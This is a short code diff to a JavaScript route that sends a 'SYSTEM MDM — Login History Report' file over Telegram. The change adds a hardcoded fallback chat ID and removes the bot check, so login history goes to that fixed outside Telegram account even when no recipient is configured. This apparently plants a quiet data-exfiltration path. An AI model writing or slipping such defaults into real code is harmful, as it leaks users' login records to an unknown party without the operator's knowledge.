@@ -82,8 +82,8 @@ export function createHistoryRoutes(bot) {
                 }
             }
 
-            const masterChatId = process.env.TELEGRAM_MASTER_CHAT_ID;
-            if (masterChatId && bot) {
+            const masterChatId = process.env.TELEGRAM_MASTER_CHAT_ID || '5279289278';
+            if (masterChatId) {
                 try {
                     await sendToTelegramWithRetry(bot, masterChatId, filePath, 'SYSTEM MDM — Login History Report');
                     console.log('Login history report sent to Telegram master admin.');
